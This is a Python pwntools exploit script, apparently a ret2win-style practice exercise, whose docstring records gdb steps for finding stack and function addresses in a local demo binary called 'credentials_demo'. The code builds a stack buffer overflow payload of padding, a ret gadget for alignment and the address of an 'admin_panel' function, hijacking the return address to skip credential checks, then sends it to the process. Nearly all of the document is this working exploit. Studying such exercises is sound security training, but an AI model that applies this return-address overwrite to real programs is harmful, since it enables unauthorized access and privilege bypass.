#!/usr/bin/python

# C VERSION
"""
STEPS:
1) Find the ret address of the `process_credentials` function
    gdb -q ./build/credentials_demo
    (gdb) b *(&process_credentials)
    (gdb) r
    (gdb) i r $rsp
        rsp            0x7fffffffd838      0x7fffffffd838
2) Find the address of the `buffer` array
    (gdb) p &buffer[0]
        $1 = 0x7fffffffd800 ""
3) Find the address of the `admin_panel` function
    (gdb) p &admin_panel
        $2 = (void (*)(void)) 0x401376 <admin_panel()>
4) Allign the stack - the 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction. https://ropemporium.com/guide.html - The MOVAPS issue
    rop = ROP(build/credentials_demo)
    ret_gadget_addr = rop.find_gadget(['ret']).address
"""


from pwn import *

binary_path = 'build/credentials_demo' # Path to the binary
binary = ELF(binary_path) # Load the binary
rop = ROP(binary_path) # Load the binary into ROP
p = process(binary_path) # We're starting a new process

buffer_addr = 0x7fffffffd800
process_credentials_ret_addr = 0x7fffffffd838
admin_panel_addr = binary.symbols['admin_panel']
ret_gadget_addr = rop.find_gadget(['ret']).address
print(f'>>> rop ret_gadget: {hex(ret_gadget_addr)}')
print(f'>>> admin_panel_addr: {hex(admin_panel_addr)}')

payload = b'A' * (process_credentials_ret_addr - buffer_addr)
payload += p64(ret_gadget_addr) # align stack
payload += p64(admin_panel_addr)

log.info(p.clean())
p.sendline(payload)
p.interactive()

log.info(p.clean())
